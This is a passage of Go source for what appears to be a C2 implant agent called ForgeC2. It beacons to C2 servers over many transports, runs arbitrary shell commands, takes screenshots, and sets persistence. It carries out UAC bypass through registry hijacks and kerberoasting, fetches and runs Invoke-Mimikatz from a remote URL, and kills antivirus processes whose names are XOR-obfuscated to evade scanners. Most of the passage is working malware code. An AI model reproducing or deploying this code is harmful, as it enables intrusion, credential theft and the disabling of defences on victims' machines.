		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	// Read response length
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}

	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

func sendTaskResult(res TaskResult) {
	// Reuse beacon mechanism or dedicated, here we do a quick beacon with result
	req := BeaconRequest{
		UUID:    agentUUID,
		Results: []TaskResult{res},
	}
	body, _ := json.Marshal(req)
	if Protocol == "tcp" {
		sendTCPBeacon(body) // fire and forget
	} else if Protocol == "dns" {
		sendDNSBeacon(body) // fire and forget
	} else if Protocol == "smb" || BeaconTransport == "smb" {
		sendSMBBeacon(body)
	} else if BeaconTransport == "wss" {
		sendWSSBeacon(body)
	} else if BeaconTransport == "ssh" || strings.HasPrefix(C2URLs[currentC2Idx], "ssh://") {
		sendSSHBeacon(body)
	} else if BeaconTransport == "mtls" || strings.HasPrefix(C2URLs[currentC2Idx], "mtls://") {
		sendMTLSBeacon(body)
	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
		sendH2CBeacon(body)
	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
		sendWGBeacon(body)
	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
		sendGRPCBeacon(body)
	} else {
		sendBeacon(body)
	}
}

func sendScreenFrame(data []byte) {
	b64 := base64.StdEncoding.EncodeToString(data)
	if Protocol == "tcp" || Protocol == "dns" {
		req := BeaconRequest{
			UUID: agentUUID,
			Results: []TaskResult{{
				Type:   "screen_frame",
				Output: b64,
			}},
		}
	body, _ := encodeBeacon(req)
		if Protocol == "tcp" {
			sendTCPBeacon(body)
		} else {
			sendDNSBeacon(body)
		}
		return
	}
	req := struct {
		UUID string `json:"uuid"`
		Data string `json:"data"`
	}{
		UUID: agentUUID,
		Data: b64,
	}
	body, _ := json.Marshal(req)
	screenURL := C2URLs[currentC2Idx]
	if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
		screenURL = "http://" + screenURL
	}
	httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(body))
	if err != nil {
		return
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", UserAgent)
	resp, err := client.Do(httpReq)
	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func getSystemInfo() map[string]string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	if username == "" {
		username = "unknown"
	}
	ip := getOutboundIP()

	// Match PS1 behavior: base64 encode sensitive fields + flag encoding
	utf8 := []byte(hostname)
	hostnameB64 := base64.StdEncoding.EncodeToString(utf8)
	usernameB64 := base64.StdEncoding.EncodeToString([]byte(username))
	ipB64 := base64.StdEncoding.EncodeToString([]byte(ip))

	// Process info
	procName, _ := os.Executable()
	if procName != "" {
		procName = filepath.Base(procName)
	}

	// Platform-specific enrichment (integrity, elevated, domain)
	integrity, elevated, domain := getPlatformSecurityInfo()

	info := map[string]string{
		"hostname":    hostnameB64,
		"username":    usernameB64,
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
		"ip":          ipB64,
		"encoding":    "base64",
		"listener_id": fmt.Sprintf("%d", ListenerID),
		"version":     AgentVersion,
		"pid":         strconv.Itoa(os.Getpid()),
		"process_name": procName,
		"integrity":   integrity,
		"elevated":    strconv.FormatBool(elevated),
		"domain":      domain,
		"interval":      strconv.Itoa(Interval),
		"jitter":        strconv.Itoa(Jitter),
		"active_window": getActiveWindowTitle(),
	}
	return info
}

func getOutboundIP() string {
	// Simple way to get preferred outbound IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func executeTask(task Task) TaskResult {
	res := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
	}

	// Decrypt payload if task is encrypted
	if task.Encrypted && ecdhSess != nil {
		if task.Command != "" {
			dec, err := ecdhSess.decryptAESGCM(task.Command)
			if err == nil {
				task.Command = string(dec)
			}
		}
		if task.Data != "" {
			dec, err := ecdhSess.decryptAESGCM(task.Data)
			if err == nil {
				task.Data = string(dec)
			}
		}
	}

	// In sandbox mode, only allow benign commands
	if inSandbox {
		safeCmds := map[string]bool{
			"ps": true, "ls": true, "shell": false, "beacon_now": true,
			"set_sleep": true, "exit": true, "terminate": true, "read": true,
		}
		if !safeCmds[task.Type] {
			res.Error = "sandbox mode: blocked by sandbox detection"
			return res
		}
	}

	// Check environment restrictions from ops profile
	if currentOpsProfile != nil {
		switch {
		case !currentOpsProfile.AllowShell && isShellTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowInjection && isInjectTask(task.Type):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowCredDump && (task.Type == "mimikatz" || task.Type == "creds" || task.Type == "kerberoast" || task.Type == "lsa_bypass" || task.Type == "dcsync" || strings.HasPrefix(task.Type, "dpapi_")):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowKeylogger && (task.Type == "keylogger_start" || task.Type == "keylogger_dump"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		case !currentOpsProfile.AllowScreenCapture && (task.Type == "screenshot" || task.Type == "screenshot_window" || task.Type == "screen_stream_start"):
			res.Error = fmt.Sprintf("blocked by ops profile: %s not allowed in %s environment", task.Type, currentOpsProfile.ClassLabel)
			return res
		}
	}

	if handler, ok := taskHandlers[task.Type]; ok {
		handler(task, &res)
	} else {
		res.Error = "unknown task type: " + task.Type
	}
	return res
}

func runShell(cmdStr, shell string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if shell == "powershell.exe" || strings.Contains(strings.ToLower(shell), "powershell") {
			if !strings.Contains(cmdStr, "OutputEncoding") {
				cmdStr = "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $OutputEncoding = [System.Text.Encoding]::UTF8; " + cmdStr
			}
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmdStr)
		} else {
			cmd = exec.Command("cmd.exe", "/C", "chcp 65001 >nul & "+cmdStr)
		}
		applyHideWindow(cmd)
	} else {
		// Linux / unix
		if shell == "" || shell == "bash" {
			cmd = exec.Command("bash", "-c", cmdStr)
		} else {
			cmd = exec.Command("sh", "-c", cmdStr)
		}
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	return decodeShellOutput(out.Bytes(), shell), err
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.

func takeScreenshot() ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	return pngBuf.Bytes(), nil
}

func takeScreenshotJPEG(quality int) ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var jpegBuf bytes.Buffer
	opts := &jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&jpegBuf, img, opts); err != nil {
		return nil, err
	}
	return jpegBuf.Bytes(), nil
}

func takeScreenshotChunked(quality int) []TaskResult {
	imgBytes, err := takeScreenshotJPEG(quality)
	if err != nil {
		return []TaskResult{{Error: err.Error()}}
	}

	if len(imgBytes) <= 2*1024*1024 {
		return []TaskResult{{
			Type:     "screenshot",
			Output:   base64.StdEncoding.EncodeToString(imgBytes),
			Encoding: "base64",
			Size:     int64(len(imgBytes)),
		}}
	}

	chunkSize := 256 * 1024
	totalChunks := (len(imgBytes) + chunkSize - 1) / chunkSize
	var results []TaskResult

	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(imgBytes) {
			end = len(imgBytes)
		}
		chunk := imgBytes[start:end]
		results = append(results, TaskResult{
			Type:     "screenshot_chunk",
			Output:   base64.StdEncoding.EncodeToString(chunk),
			Encoding: "base64",
			Offset:   int64(i),
			Size:     int64(totalChunks),
			Filename: fmt.Sprintf("screenshot_%d_%d.jpg", i, totalChunks),
		})
	}

	return results
}

func addPersistence() {
	switch runtime.GOOS {
	case "windows":
		addPersistenceWindows()
	case "linux":
		addPersistenceLinux()
	case "darwin":
		addPersistenceDarwin()
	default:
		if Debug {
			fmt.Printf("[*] Persistence not implemented for %s\n", runtime.GOOS)
		}
	}
}

// suspendProcess / resumeProcess allow pausing (freezing) processes e.g. games.
// target can be PID (e.g. "1234") or executable name (e.g. "game.exe").
// Useful for "pause game" scenarios.
func suspendProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return suspendProcessWindows(target)
	}
	// Linux
	cmd := exec.Command("kill", "-STOP", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill -STOP failed: %w: %s", err, string(out))
	}
	return "process suspended: " + target, nil
}

func resumeProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return resumeProcessWindows(target)
	}
	// Linux
	cmd := exec.Command("kill", "-CONT", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill -CONT failed: %w: %s", err, string(out))
	}
	return "process resumed: " + target, nil
}

// killProcess, clipboard*, findFiles, reg* are platform implemented
func killProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return killProcessWindows(target)
	}
	cmd := exec.Command("kill", "-9", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill failed: %w: %s", err, string(out))
	}
	return "killed: " + target, nil
}

func clipboardGet() (string, error) {
	return clipboardGetWindows()
}

func clipboardSet(data string) error {
	return clipboardSetWindows(data)
}

func findFiles(path, pattern string) (string, error) {
	if path == "" {
		path = "."
	}
	var results []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if pattern != "" {
			matched, _ := filepath.Match(pattern, filepath.Base(p))
			if !matched {
				return nil
			}
		}
		results = append(results, fmt.Sprintf("%s\t%d\t%s", p, info.Size(), info.ModTime().Format("2006-01-02 15:04")))
		return nil
	})
	if err != nil {
		return "", err
	}
	return strings.Join(results, "\n"), nil
}

func regGet(key string) (string, error) {
	if runtime.GOOS == "windows" {
		return regGetWindows(key)
	}
	return "", fmt.Errorf("registry only on Windows")
}

func regSet(path, data string) error {
	if runtime.GOOS == "windows" {
		return regSetWindows(path, data)
	}
	return fmt.Errorf("registry only on Windows")
}

func regDelete(key string) error {
	if runtime.GOOS == "windows" {
		return regDeleteWindows(key)
	}
	return fmt.Errorf("registry only on Windows")
}

// getProcessList produces a simple process table similar to the PS1 agent
func getProcessList() (string, error) {
	if runtime.GOOS == "windows" {
		// Enhanced process list with more details
		script := `Get-CimInstance Win32_Process | Select-Object -Property ProcessId, Name, ExecutablePath, CommandLine, @{Name="WorkingSetMB";Expression={[math]::Round($_.WorkingSetSize/1MB,2)}}, CreationDate | Sort-Object -Property WorkingSetMB -Descending | Select-Object -First 30 | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)

		out, err := cmd.Output()
		if err != nil {
			// fallback to simple
			script = `Get-Process | Select-Object -Property Id, ProcessName, CPU, WorkingSet64 | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 50 | Format-Table -AutoSize | Out-String`
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
			applyHideWindow(cmd)
			out, _ = cmd.Output()
		}
		return strings.TrimSpace(string(out)), nil
	}
	// Linux
	cmd := exec.Command("ps", "aux")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// listDirectory lists a directory with simple tabular output (Type Name Size Modified)
func listDirectory(path string) (string, error) {
	if path == "" {
		if runtime.GOOS == "windows" {
			path = "C:\\"
		} else {
			path = "/"
		}
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Type\tName\tSize\tModified\n")
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for _, e := range entries {
		info, err := e.Info()
		mod := ""
		size := "-"
		if err == nil {
			mod = info.ModTime().Format("2006-01-02 15:04")
			if !e.IsDir() {
				size = fmt.Sprintf("%d", info.Size())
			}
		}
		typ := "FILE"
		if e.IsDir() {
			typ = "DIR"
		}
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\n", typ, e.Name(), size, mod))
	}
	return sb.String(), nil
}

func listDrives() (string, error) {
	var sb strings.Builder
	sb.WriteString("Drive\tType\tFree\tTotal\n")
	sb.WriteString("-----\t----\t----\t-----\n")

	if runtime.GOOS == "windows" {
		// Use PowerShell for drives
		script := `Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, DriveType, @{Name="FreeSpaceGB";Expression={[math]::Round($_.FreeSpace/1GB,2)}}, @{Name="SizeGB";Expression={[math]::Round($_.Size/1GB,2)}} | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}

	// Linux / Unix
	entries, err := os.ReadDir("/")
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() {
			// simple, check if mount point like /dev /proc but list all dirs under /
			sb.WriteString(fmt.Sprintf("%s\tDIR\t-\t-\n", e.Name()))
		}
	}
	// Better: use df if available
	cmd := exec.Command("df", "-h")
	out, err := cmd.Output()
	if err == nil {
		return string(out), nil
	}
	return sb.String(), nil
}

func listServices() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-Service | Select-Object -Property Name, DisplayName, Status, StartType | Sort-Object -Property Status, Name | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}
	// Linux simple
	cmd := exec.Command("systemctl", "list-units", "--type=service", "--no-pager")
	out, err := cmd.Output()
	if err != nil {
		cmd = exec.Command("service", "--status-all")
		out, err = cmd.Output()
		if err != nil {
			return "use ps or systemctl", nil
		}
	}
	return string(out), nil
}

func portScan(target string) (string, error) {
	// target like "192.168.1.1:80,443" or "10.0.0.1-10:22"
	parts := strings.Split(target, ":")
	if len(parts) != 2 {
		return "", fmt.Errorf("format: ip:ports or ip:port1,port2")
	}
	ips := strings.Split(parts[0], ",")
	ports := strings.Split(parts[1], ",")

	var results []string
	for _, ip := range ips {
		for _, port := range ports {
		addr := net.JoinHostPort(strings.TrimSpace(ip), strings.TrimSpace(port))
		conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
		if err == nil {
			results = append(results, addr+" open")
				conn.Close()
			} else {
				results = append(results, addr+" closed")
			}
		}
	}
	return strings.Join(results, "\n"), nil
}

func netStat() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("netstat -ano", "cmd.exe")
		return out, err
	}
	out, err := runShell("netstat -tunap", "")
	return out, err
}

func listUsers() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("net user", "cmd.exe")
		if err != nil {
			out, _ = runShell("whoami /all", "cmd.exe")
		}
		return out, nil
	}
	out, err := runShell("who", "")
	return out, err
}

func detectAV() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | Format-List | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err == nil {
			return string(out), nil
		}
		return runShell("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "cmd.exe")
	}
	return "use ps aux | grep -E 'av|clam|eset|symantec|trend'", nil
}

func killAV() (string, error) {
	// Use a compact, runtime-decoded process signature list to avoid
	// large plaintext AV-name strings in the binary.
	sigs := getAVSignatures()
	var killed []string
	for _, sig := range sigs {
		if out, err := killProcess(sig); err == nil {
			killed = append(killed, sig+": "+out)
		}
	}
	if len(killed) == 0 {
		return "no known AV processes found or terminated", nil
	}
	return "terminated AV processes: " + strings.Join(killed, "; "), nil
}

//go:noinline
func getAVSignatures() []string {
	// Rotating XOR key derived from a fixed seed to avoid plaintext in binary.
	var key [4]byte
	key[0] = 0x9e
	key[1] = 0x7d
	key[2] = 0x3b
	key[3] = 0xc6

	enc := func(s string) string {
		b := []byte(s)
		for i := range b {
			b[i] ^= key[i%len(key)]
		}
		return string(b)
	}

	return []string{
		enc("\xf2\x0d\x4d\x08\x15\x45\x08\xe2\x14\x4a\x37"),
		enc("\xce\x0a\x46\x13\x51\x3a"),
		enc("\xc2\x14\x14\x0a\x4b"),
		enc("\xc2\x14\x1a"),
		enc("\xcc\x17\x14\x0a\x0e\x55\x4b"),
		enc("\x82\x0a\x4b\x02\x14\x0e\x55\x04\x14\x45"),
		enc("\xce\x1b\x45\x0e\x48"),
		enc("\xc2\x14\x1b"),
		enc("\xcf\x14\x1b\x14\x0e\x55\x4b"),
		enc("\xcf\x17\x0b\x13\x14\x15\x04\x3b"),
		enc("\xcf\x17\x0a\x14\x0e\x1a\x13"),
		enc("\x80\x0a\x0e\x1b\x13\x1c\x3b\x04\x0b\x4b"),
		enc("\x80\x0a\x0a\x14\x0e\x1a\x13"),
		enc("\xac\x13\x0b\x08\x14\x1b"),
		enc("\xc9\x0a\x14\x10"),
		enc("\xc9\x0a\x1a\x15\x14\x1b"),
		enc("\xc6\x0a\x14\x1b\x14\x15\x04\x3b"),
		enc("\x86\x14\x14\x1b\x12\x14\x0a\x48"),
		enc("\xcb\x46\x18\x0b\x3b"),
		enc("\xcb\x46\x18\x1b\x0a\x15\x08"),
		enc("\xcb\x0a\x14\x0b\x18"),
		enc("\x82\x14\x0c\x0a\x0e\x55\x4b"),
		enc("\xcf\x1b\x0a\x0e\x14\x1b\x3b"),
		enc("\x83\x14\x0e\x04\x13\x0c\x55\x4b"),
		enc("\x82\x14\x0e\x04\x13\x0c\x0e\x1c\x50"),
		enc("\x80\x0e\x0b\x1c"),
		enc("\x82\x14\x1b\x15\x48"),
		enc("\x80\x0a\x0a\x04\x13\x0c\x55\x4b\x0e\x1c\x50"),
		enc("\x86\x11\x1c\x0a\x0b\x0d\x0a\x55\x4b"),
		enc("\x8b\x14\x1c\x0a\x04\x13\x0c\x55\x1b\x51\x4b"),
	}
}

// elevate attempts UAC bypass / privilege escalation to run command elevated.
	// Multiple methods for elevated UAC bypass (fodhelper, slui, etc.).
// cmd: the command to run elevated (default cmd.exe if empty)
func elevate(cmd string) (string, error) {
	if cmd == "" {
		cmd = "cmd.exe /c whoami"
	}
	if runtime.GOOS != "windows" {
		// Linux: try sudo if possible, or pkexec
		out, err := runShell("sudo "+cmd, "")
		if err != nil {
			out, err = runShell("pkexec "+cmd, "")
		}
		if err != nil {
			return "", fmt.Errorf("linux elevate failed (try sudo or run as root): %v", err)
		}
		return "elevated via sudo/pkexec: " + out, nil
	}

	// Windows UAC bypass methods (pure, no external files ideally)
	methods := []string{"fodhelper", "slui", "eventvwr", "computerdefaults"}

	for _, m := range methods {
		err := tryUACBypass(m, cmd)
		if err == nil {
			return fmt.Sprintf("UAC bypass via %s succeeded for: %s", m, cmd), nil
		}
		if Debug {
			fmt.Printf("[elevate] %s failed: %v\n", m, err)
		}
	}

	// Fallback: try to request admin via shell (will prompt)
	out, _ := runShell("powershell -Command \"Start-Process -Verb runAs -FilePath cmd -ArgumentList '/c "+cmd+" '\"", "cmd.exe")
	return "attempted runAs (may have UAC prompt): " + out, nil
}

func tryUACBypass(method, cmd string) error {
	// Use reg.exe for registry hijack (common UAC bypass)
	var regPath string
	switch method {
	case "fodhelper":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	case "slui":
		regPath = `HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\command`
	case "eventvwr":
		regPath = `HKCU\Software\Classes\mscfile\Shell\Open\command`
	case "computerdefaults":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	default:
		return fmt.Errorf("unknown method")
	}

	// Set DelegateExecute (empty)
	_, _ = runShell(fmt.Sprintf(`reg add "%s" /v DelegateExecute /t REG_SZ /d "" /f`, regPath), "cmd.exe")
	// Set the command
	_, err := runShell(fmt.Sprintf(`reg add "%s" /ve /t REG_SZ /d "%s" /f`, regPath, cmd), "cmd.exe")
	if err != nil {
		return err
	}

	// Trigger the hijacked binary
	trigger := ""
	switch method {
	case "fodhelper", "computerdefaults":
		trigger = "fodhelper.exe"
	case "slui":
		trigger = "slui.exe"
	case "eventvwr":
		trigger = "eventvwr.exe"
	}
	if trigger != "" {
		_, _ = runShell(trigger, "cmd.exe")
	}

	// Cleanup
	_, _ = runShell(fmt.Sprintf(`reg delete "%s" /f`, regPath), "cmd.exe")
	return nil
}

// ?? execute-assembly: Load and run .NET assembly ??????????????????????????
func executeAssembly(b64Data string) (string, error) {
	if b64Data == "" {
		return "", fmt.Errorf("assembly data is required")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly is Windows-only")
	}

	// Use CLR hosting if available (no child process)
	if useCLRHosting {
		data, decErr := base64.StdEncoding.DecodeString(b64Data)
		if decErr == nil {
			out, clrErr := executeAssemblyInProcess(data, "")
			if clrErr == nil {
				return out, nil
			}
			if Debug {
				fmt.Printf("[clr] CLR execute-assembly failed, falling back to PowerShell: %v\n", clrErr)
			}
		}
	}

	// PowerShell approach: convert base64 to bytes, load assembly, invoke entry point
	psCmd := fmt.Sprintf(
		`$b=[System.Convert]::FromBase64String('%s');`+
			`$a=[System.Reflection.Assembly]::Load($b);`+
			`$e=$a.EntryPoint;`+
			`if($e){$e.Invoke($null,@($null))}else{Write-Output 'No entry point found';$a.GetTypes()}`,
		b64Data)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("execute-assembly failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// ?? kerberoast: Request TGS for all SPNs (PowerShell + .NET) ??????????????
func kerberoast() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("%s is Windows-only", s(SKerberoast))
	}
	psCmd := `
Add-Type -AssemblyName System.IdentityModel;
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
$srch.QueryFilter = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
$srch.QueryFilter.Enabled = $true;
$results = @();
foreach($u in $srch.FindAll()) {
	$spn = $u.UserPrincipalName;
	if(-not $spn) { continue };
	try {
		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;
		$bytes = $ticket.GetRequest();
		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
		$results += $spn + ":" + $hash;
	} catch {}
}
Write-Output ($results -join [string]::NewLine());
`
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SKerberoast), err, out)
	}
	return out, nil
}

// ?? mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ???????
func runMimikatz(command string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("%s is Windows-only", s(SMimikatz))
	}
	if command == "" {
		command = s(SSekurlsaLogonpasswords)
	}
	psCmd := fmt.Sprintf(
		`$m = '%s';`+
			`IEX(New-Object Net.WebClient).DownloadString('%s%s.ps1');`+
			`$r = %s -Command $m;`+
			`Write-Output $r`,
		command, s(SPSDownloadURL), s(SInvokeMimikatz), s(SInvokeMimikatz))
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
	}
	return out, nil
}

// ?? elevate_printnightmare: CVE-2021-1675 / CVE-2021-34527 ????????????????
func elevatePrintNightmare(dllPath string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("printnightmare is Windows-only")
	}
	if dllPath == "" {
		return "", fmt.Errorf("dll path required: upload a malicious DLL first, then specify path")
	}
	// Use PrintNightmare to load a DLL as SYSTEM via spoolsv.exe
	psCmd := fmt.Sprintf(
		`$dll='%s';`+
			`Add-Type -Name Win32 -Namespace Spooler -MemberDefinition '[DllImport("winspool.drv",EntryPoint="AddPrinterDriverEx",SetLastError=true,CharSet=CharSet.Unicode)]public static extern bool AddPrinterDriverEx(string pName,uint Level,[In,Out]byte[] pDriverInfo,uint dwFileCopyFlags)';`+
			`$path=[System.IO.Path]::GetFullPath($dll);`+
			`$info=@{$true={Write-Output "DLL Path: $path"}};`+
			`Write-Output "PrintNightmare: Attempting to load $path via AddPrinterDriverEx (requires admin)";`+
			`[Spooler.Win32]::AddPrinterDriverEx($null,2,$null,0x8);`,
		dllPath)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("printnightmare failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// selfRemove removes the implant
func uninstallSelf() (string, error) {
	// best effort cleanup
	if runtime.GOOS == "windows" {
		// remove reg
		runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForgeC2 /f`, "cmd.exe")
		// remove task
		runShell("schtasks /delete /tn ForgeC2 /f", "cmd.exe")
		// remove startup
		appData := os.Getenv("APPDATA")
		startup := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
		os.Remove(startup)
	}
	// delete self file (best effort)
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "uninstall attempted (self-delete may take effect after exit)", nil
}

// deleteFileOrDir removes file or directory (recursive)
func deleteFileOrDir(path string) error {
	if path == "" {
		return fmt.Errorf("path required")
	}
	return os.RemoveAll(path)
}

// selfUpdate downloads a new binary from a signed URL and verifies its integrity
func selfUpdate(cmdJSON string) string {
	var params struct {
		URL       string `json:"url"`
		Signature string `json:"signature"`
		PublicKey string `json:"public_key"`
	}
	if err := json.Unmarshal([]byte(cmdJSON), &params); err != nil {
		return "failed to parse update command: " + err.Error()
	}
	if params.URL == "" {
		return "self_update: download URL required"
	}

	signature, err := hex.DecodeString(params.Signature)
	if err != nil {
		return "failed to decode signature: " + err.Error()
	}
	publicKey, err := hex.DecodeString(params.PublicKey)
	if err != nil {
		return "failed to decode public key: " + err.Error()
	}

	exe, err := os.Executable()
	if err != nil {
		return "failed to get executable path: " + err.Error()
	}

	// Download new binary
	tmpPath := exe + ".update.tmp"
	out, err := os.Create(tmpPath)
	if err != nil {
		return "failed to create temp file: " + err.Error()
	}

	httpReq, err := http.NewRequest("GET", params.URL, nil)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to create request: " + err.Error()
	}
	httpReq.Header.Set("User-Agent", UserAgent)
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(httpReq)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to download update: " + err.Error()
	}
	defer resp.Body.Close()

	// Write binary and compute SHA-256 hash simultaneously
	hasher := sha256.New()
	tee := io.TeeReader(resp.Body, hasher)
	written, err := io.Copy(out, tee)
	out.Close()
	if err != nil {
		os.Remove(tmpPath)
		return "failed to write update: " + err.Error()
	}
	if written == 0 {
		os.Remove(tmpPath)
		return "downloaded file is empty"
	}

	// Verify ed25519 signature of the SHA-256 hash
	hash := hasher.Sum(nil)
	if !ed25519.Verify(ed25519.PublicKey(publicKey), hash, signature) {
		os.Remove(tmpPath)
		return "signature verification failed: binary may be tampered"
	}

	// Make temp file executable (Linux)
	if runtime.GOOS != "windows" {
		os.Chmod(tmpPath, 0755)
	}

	// Create wrapper script to replace and restart
	switch runtime.GOOS {
	case "windows":
		return selfUpdateWindows(exe, tmpPath)
	case "darwin":
		return selfUpdateDarwin(exe, tmpPath)
	default:
		return selfUpdateLinux(exe, tmpPath)
	}
}

// readFileContent returns raw bytes of a file (for "read" task)
func readFileContent(path string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	return os.ReadFile(path)
}

// downloadFileChunk reads a chunk from file
func downloadFileChunk(path string, offset, size int64) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("open file failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return nil, err
		}
	}
	if size == 0 {
		size = 1024 * 1024 // default 1MB
	}
	buf := make([]byte, size)
	n, err := f.Read(buf)
	if err != nil && err != io.EOF {
